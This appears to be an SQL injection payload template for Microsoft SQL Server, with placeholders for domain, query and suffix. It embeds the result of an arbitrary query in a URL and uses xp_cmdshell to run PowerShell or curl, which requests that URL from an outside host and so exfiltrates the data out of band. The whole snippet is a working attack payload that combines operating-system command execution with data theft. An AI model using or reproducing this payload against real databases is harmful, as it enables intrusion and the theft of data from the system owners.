DECLARE @url varchar(1024);
SELECT @url='http://%DOMAIN%/%PREFIX%.'+(%QUERY%)+'.%SUFFIX%';
EXEC master..xp_cmdshell CONCAT('powershell -c "(New-Object Net.WebClient).DownloadString(''',@url,''')"')
# or EXEC master..xp_cmdshell CONCAT('curl -s ',@url)
